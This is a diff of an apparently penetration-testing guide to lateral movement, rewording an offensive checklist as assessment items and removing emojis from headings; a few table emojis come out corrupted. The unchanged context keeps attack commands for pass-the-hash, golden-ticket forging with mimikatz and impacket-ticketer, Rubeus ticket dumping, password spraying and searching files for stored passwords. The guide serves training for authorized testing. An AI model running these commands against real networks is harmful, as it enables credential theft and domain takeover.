@@ -7,12 +7,12 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 ---
 ## Table of Contents
 
-1. [Strategy: Think in Terms of Attack Graphs](#61-strategy-think-in-terms-of-attack-graphs)
+1. [Strategy and Attack Graphs](#61-strategy-and-attack-graphs)
 2. [Windows Lateral Movement](#62-windows-lateral-movement)
 3. [Linux Lateral Movement](#63-linux-lateral-movement)
-4. [Credential Reuse & Password Spraying](#64-credential-reuse-password-spraying)
+4. [Credential Reuse and Password Spraying](#64-credential-reuse-and-password-spraying)
 5. [AD-Specific Movement](#65-ad-specific-lateral-movement)
-6. [Progress Tracking](#66-progress-tracking-documentation)
+6. [Progress Tracking and Documentation](#66-progress-tracking-and-documentation)
 
 ---
 
@@ -20,52 +20,52 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 
 ### 📊 Inventory & Asset Management
 
-- [ ] **Credentials inventory** (user:pass) documented → [6.1.2](#612-centralized-movement-tracking-table)
-- [ ] **Hashes & tickets** (NTLM, TGTs/TGSs) collected and organized → [6.5.2](#652-pass-the-ticket-ptt-movement)
-- [ ] **Compromised systems** mapped with access levels → [6.1.1](#611-network-visualization-concept)
-- [ ] **Local admin rights** across network documented → [6.6.1](#661-centralized-movement-dashboard)
+- [ ] **Inventory credential exposure (source/scope/handling)** → [6.1.2](#612-centralized-movement-tracking-table)
+- [ ] **Record hashes/tickets exposure (safe evidence)** → [6.5.2](#652-pass-the-ticket-ptt-movement)
+- [ ] **Maintain compromised-systems map (access/evidence)** → [6.1.1](#611-network-visualization-concept)
+- [ ] **Track local-admin relationships/coverage** → [6.6.1](#661-centralized-movement-dashboard)
 
-### 🪟 Windows Lateral Movement
+### 🪟 Windows Movement Surface (Assessment)
 
-- [ ] **PSExec-style** execution tested with creds/hashes → [6.2.1](#621-psexec-style-execution)
-- [ ] **WMI-based** movement attempted → [6.2.2](#622-wmi-based-movement)
-- [ ] **WinRM/PowerShell Remoting** utilized where available → [6.2.3](#623-winrm-powershell-remoting)
-- [ ] **RDP access** established for GUI interaction → [6.2.4](#624-rdp-remote-desktop)
-- [ ] **Service-based** execution methods tested → [6.2.5](#625-service-based-execution)
+- [ ] **Assess remote exec exposure (admin tooling)** → [6.2.1](#621-psexec-style-execution)
+- [ ] **Assess WMI/RPC exposure + controls** → [6.2.2](#622-wmi-based-movement)
+- [ ] **Assess WinRM/PSRemoting posture** → [6.2.3](#623-winrm-and-powershell-remoting)
+- [ ] **Assess RDP posture (NLA/MFA/groups/segmentation)** → [6.2.4](#624-rdp-remote-desktop)
+- [ ] **Assess service-based exec risk drivers** → [6.2.5](#625-service-based-execution)
 
-### 🐧 Linux Lateral Movement
+### 🐧 Linux Movement Surface (Assessment)
 
-- [ ] **SSH access** with credentials/keys attempted → [6.3.1](#631-ssh-access)
-- [ ] **Proxychains setup** for network pivoting → [6.3.2](#632-proxychains-pivoting)
-- [ ] **SSH keys** harvested and reused → [6.3.3](#633-ssh-key-harvesting)
-- [ ] **SSH agents** leveraged where available → [6.3.3](#633-ssh-key-harvesting)
+- [ ] **Assess SSH posture (auth/keys/PAM/MFA)** → [6.3.1](#631-ssh-access)
+- [ ] **Assess pivoting controls (segmentation/egress)** → [6.3.2](#632-proxychains-pivoting)
+- [ ] **Assess SSH key exposure + remediation** → [6.3.3](#633-ssh-key-harvesting)
+- [ ] **Assess agent forwarding exposure/policy** → [6.3.3](#633-ssh-key-harvesting)
 
-### 🔑 Credential Reuse & Spraying
+### 🔑 Credential Reuse & Spraying (Risk Review)
 
-- [ ] **Password reuse** across systems and services tested → [6.4.1](#641-credential-inventory-management)
-- [ ] **Credential spraying** performed (where allowed) → [6.4.2](#642-targeted-password-spraying)
-- [ ] **Results tracked** in centralized table → [6.4.1](#641-credential-inventory-management)
-- [ ] **Account lockout policies** respected → [6.4.3](#643-spraying-safety-measures)
+- [ ] **Assess reuse risk (approved/rate-limited)** → [6.4.1](#641-credential-inventory-management)
+- [ ] **Assess spraying controls (lockout/MFA/detection)** → [6.4.2](#642-targeted-password-spraying)
+- [ ] **Track outcomes in evidence table** → [6.4.1](#641-credential-inventory-management)
+- [ ] **Confirm lockout/safety constraints** → [6.4.3](#643-spraying-safety-measures)
 
-### 🏰 AD-Specific Movement
+### 🏰 AD-Specific Exposure & Containment (Assessment)
 
-- [ ] **Pass-the-Hash** used strategically between servers → [6.5.1](#651-pass-the-hash-pth-strategy)
-- [ ] **Pass-the-Ticket** leveraged for Kerberos environments → [6.5.2](#652-pass-the-ticket-ptt-movement)
-- [ ] **Admin sessions** exploited for credential harvesting → [6.5.3](#653-admin-session-exploitation)
-- [ ] **LSASS dumping** performed on compromised systems → [6.5.3](#653-admin-session-exploitation)
+- [ ] **Assess NTLM replay risk + mitigations** → [6.5.1](#651-pass-the-hash-pth-strategy)
+- [ ] **Assess Kerberos ticket misuse + mitigations** → [6.5.2](#652-pass-the-ticket-ptt-movement)
+- [ ] **Assess admin-session sprawl exposure** → [6.5.3](#653-admin-session-exploitation)
+- [ ] **Assess LSASS/store hardening enforcement** → [6.5.3](#653-admin-session-exploitation)
 
 ### 📈 Progress Tracking
 
-- [ ] **Movement table** maintained with successes/failures → [6.6.1](#661-centralized-movement-dashboard)
-- [ ] **Attack paths** documented and visualized → [6.5.4](#654-bloodhound-informed-movement)
-- [ ] **Next targets** prioritized based on value → [6.6.2](#662-next-target-prioritization)
-- [ ] **Persistence** established on critical systems → [6.6.1](#661-centralized-movement-dashboard)
+- [ ] **Maintain movement/risk dashboard (evidence)** → [6.6.1](#661-centralized-movement-dashboard)
+- [ ] **Document hypothesized attack paths (impact/controls)** → [6.5.4](#654-bloodhound-informed-movement)
+- [ ] **Prioritize next targets (value/exposure/likelihood)** → [6.6.2](#662-next-target-prioritization)
+- [ ] **Confirm persistence testing is approved** → [6.6.1](#661-centralized-movement-dashboard)
 
 ---
 
-## 6.1 🗺️ Strategy: Think in Terms of Attack Graphs
+## 6.1 Strategy and Attack Graphs
 
-### 6.1.1 📊 Network Visualization Concept
+### 6.1.1 Network Visualization Concept
 
 **Nodes & Edges Approach:**
 
@@ -73,7 +73,7 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 - **🔗 Edges**: Connection methods (SMB, WinRM, RDP, SSH, WMI)
 - **🏷️ Labels**: Access levels (local admin, user, domain admin)
 
-### 6.1.2 📋 Centralized Movement Tracking Table
+### 6.1.2 Centralized Movement Tracking Table
 
 **Movement Tracking Template:**
 
@@ -98,9 +98,9 @@ Use credentials, hashes, and tickets from one compromised host to gain **access 
 
 ---
 
-## 6.2 🪟 Windows Lateral Movement
+## 6.2 Windows Lateral Movement
 
-### 6.2.1 🚀 PSExec-Style Execution
+### 6.2.1 PSExec-Style Execution
 
 **Impacket PSExec (Linux)**
 
@@ -178,7 +178,7 @@ set RHOSTS 10.11.1.30
 exploit
 ```
 
-### 6.2.2 🔧 WMI-Based Movement
+### 6.2.2 WMI-Based Movement
 
 **Impacket WMIExec**
 
@@ -247,7 +247,7 @@ cme wmi 10.11.1.0/24 -u user -p 'Password123' -x "hostname"
 crackmapexec wmi 10.11.1.30 -u user -H NTLM_HASH -x "ipconfig"
 ```
 
-### 6.2.3 ⚡ WinRM / PowerShell Remoting
+### 6.2.3 WinRM and PowerShell Remoting
 
 **Service Detection**
 
@@ -348,7 +348,7 @@ crackmapexec winrm 10.11.1.30 -u user -H NTLM_HASH -x "ipconfig"
 crackmapexec winrm 10.11.1.30 -u user -p 'Password123' -X '$env:computername'
 ```
 
-### 6.2.4 🖥️ RDP (Remote Desktop)
+### 6.2.4 RDP (Remote Desktop)
 
 **Service Detection**
 
@@ -458,7 +458,7 @@ cme rdp 10.11.1.0/24 -u user -p 'Password123'
 crackmapexec rdp 10.11.1.30 -u user -p 'Password123' --screenshot
 ```
 
-### 6.2.5 🎯 Service-Based Execution
+### 6.2.5 Service-Based Execution
 
 **SC Manager Methods**
 
@@ -572,9 +572,9 @@ dcomexec.py -object MMC20 domain.local/user:Password123@10.11.1.30
 
 ---
 
-## 6.3 🐧 Linux Lateral Movement
+## 6.3 Linux Lateral Movement
 
-### 6.3.1 🔐 SSH Access
+### 6.3.1 SSH Access
 
 **Basic SSH Connections**
 
@@ -687,7 +687,7 @@ ssh -L 8080:localhost:80 -L 3306:localhost:3306 user@10.11.2.10
 ssh -f -N -L 8080:localhost:80 user@10.11.2.10
 ```
 
-### 6.3.2 🔄 Proxychains Pivoting
+### 6.3.2 Proxychains Pivoting
 
 **SSH Dynamic Forwarding**
 
@@ -819,7 +819,7 @@ run -j
 proxychains nmap -sT 10.11.3.0/24
 ```
 
-### 6.3.3 🗝️ SSH Key Harvesting
+### 6.3.3 SSH Key Harvesting
 
 **Common Key Locations**
 
@@ -931,7 +931,7 @@ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas
 cat /etc/ssh/sshd_config | grep -v "^#"
 ```
 
-### 6.3.4 🛠️ Alternative Linux Movement
+### 6.3.4 Alternative Linux Movement
 
 **RSH/Rexec (Legacy)**
 
@@ -1027,9 +1027,9 @@ find /tmp/tmux-* 2>/dev/null
 
 ---
 
-## 6.4 🔑 Credential Reuse & Password Spraying
+## 6.4 Credential Reuse and Password Spraying
 
-### 6.4.1 📊 Credential Inventory Management
+### 6.4.1 Credential Inventory Management
 
 **Credential Tracking Template:**
 
@@ -1096,7 +1096,7 @@ cat ~/.bash_history
 find / -name "*.conf" -exec grep -i "password" {} \; 2>/dev/null
 ```
 
-### 6.4.2 🎯 Targeted Password Spraying
+### 6.4.2 Targeted Password Spraying
 
 **Pre-Spraying Reconnaissance**
 
@@ -1256,7 +1256,7 @@ wfuzz -c -z file,users.txt -z file,passwords.txt -d "username=FUZZ&password=FUZ2
 patator http_fuzz url=http://10.11.1.50/login method=POST body='username=FILE0&password=FILE1' 0=users.txt 1=passwords.txt -x ignore:fgrep='Invalid'
 ```
 
-### 6.4.3 ⚠️ Spraying Safety Measures
+### 6.4.3 Spraying Safety Measures
 
 **Lockout Prevention**
 
@@ -1342,9 +1342,9 @@ done
 
 ---
 
-## 6.5 🏰 AD-Specific Lateral Movement
+## 6.5 AD-Specific Lateral Movement
 
-### 6.5.1 🔄 Pass-the-Hash (PtH) Strategy
+### 6.5.1 Pass-the-Hash (PtH) Strategy
 
 **Understanding Pass-the-Hash**
 
@@ -1370,7 +1370,7 @@ crackmapexec smb 10.11.1.0/24 -u user -H NTLM_HASH --local-auth
 cme smb 10.11.1.0/24 -u user -H NTLM_HASH
 ```
 
-### 6.5.2 🎫 Pass-the-Ticket (PtT) Movement
+### 6.5.2 Pass-the-Ticket (PtT) Movement
 
 **Understanding Kerberos Tickets**
 
@@ -1544,7 +1544,7 @@ mimikatz # kerberos::golden /domain:domain.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXX
 impacket-ticketer -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX -domain domain.local -spn cifs/server01.domain.local Administrator
 ```
 
-### 6.5.3 👥 Admin Session Exploitation
+### 6.5.3 Admin Session Exploitation
 
 **Session Enumeration**
 
@@ -1702,7 +1702,7 @@ Invoke-TokenManipulation -Enumerate
 .\Rubeus.exe dump /luid:0x3e7
 ```
 
-### 6.5.4 🗺️ BloodHound-Informed Movement
+### 6.5.4 BloodHound-Informed Movement
 
 **BloodHound Data Collection**
 
@@ -1862,9 +1862,9 @@ Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Obje
 
 ---
 
-## 6.6 📈 Progress Tracking & Documentation
+## 6.6 Progress Tracking and Documentation
 
-### 6.6.1 🎯 Centralized Movement Dashboard
+### 6.6.1 Centralized Movement Dashboard
 
 **Movement Tracking Database:**
 
@@ -1876,7 +1876,7 @@ Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Obje
 |--------|----|---------------|-------------|--------|------------|
 | DC01 | 10.11.1.20 | DCSync | krbtgt hash | ✅ Compromised | Golden Ticket |
 | SQL01 | 10.11.1.25 | WinRM | sqlservice | ✅ Compromised | DB credential harvest |
-| FS01 | 10.11.1.30 | SMB PtH | backup_ops | ⚠️ Limited | Local privilege escalation |
+| FS01 | 10.11.1.30 | SMB PtH | backup_ops | � ️ Limited | Local privilege escalation |
 | EXCH01 | 10.11.1.35 | RDP | admin | ⏳ In Progress | PrivExchange exploitation |
 | WEB01 | 10.11.1.40 | SSH | webadmin | ✅ Compromised | Pivot to internal network |
 
@@ -1910,7 +1910,7 @@ Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Obje
 | Username | Domain Role | Active Sessions | Last Seen | Target Priority |
 |----------|------------|----------------|-----------|-----------------|
 | administrator | Domain Admin | DC01, EXCH01 | 2024-01-15 10:00 | 🔴 Critical |
-| sqlservice | Service Account | SQL01, SQL02, SQL03 | 2024-01-15 09:30 | 🟠 High |
+| sqlservice | Service Account | SQL01, SQL02, SQL03 | 2024-01-15 09:30 | �  High |
 | backup_ops | Backup Operators | FS01, BACKUP01 | 2024-01-15 08:00 | 🟡 Medium |
 | webadmin | Local Admin (web) | WEB01, WEB02 | 2024-01-15 11:00 | 🟢 Low |
 ```
@@ -1934,7 +1934,7 @@ Get-ADComputer -Identity target_computer -Properties ms-Mcs-AdmPwd | Select-Obje
 | 10:30 | Golden ticket | All systems | Forged TGT | Full domain control |
 ```
 
-### 6.6.2 🚀 Next Target Prioritization
+### 6.6.2 Next Target Prioritization
 
 **Target Priority Matrix:**
 
